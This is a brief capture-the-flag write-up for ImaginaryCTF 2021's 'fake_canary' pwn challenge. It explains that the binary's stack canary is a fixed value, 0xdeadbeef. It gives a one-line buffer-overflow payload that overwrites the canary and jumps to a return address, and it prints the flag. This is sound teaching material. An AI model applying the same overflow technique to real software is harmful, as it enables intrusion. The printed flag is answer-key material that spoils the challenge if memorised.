# Fake canary

## Task

Here at Stack Smasher Inc, we protect all our stacks with industry grade canaries!

[fake_canary](https://2021.imaginaryctf.org/r/fake_canary)
`nc chal.imaginaryctf.org 42002`

## Solution

We look at the binary in ghidra and see that it has a stack
canary which needs to be 0xdeadbeef.
The canary is static, so it does nothing, we can just
overwrite it with the expected value:

payload = cyclic(40)+p64(0xdeadbeef)+p64(0)+p64(0x400726)

and we get the flag
`ictf{m4ke_y0ur_canaries_r4ndom_f492b211}`
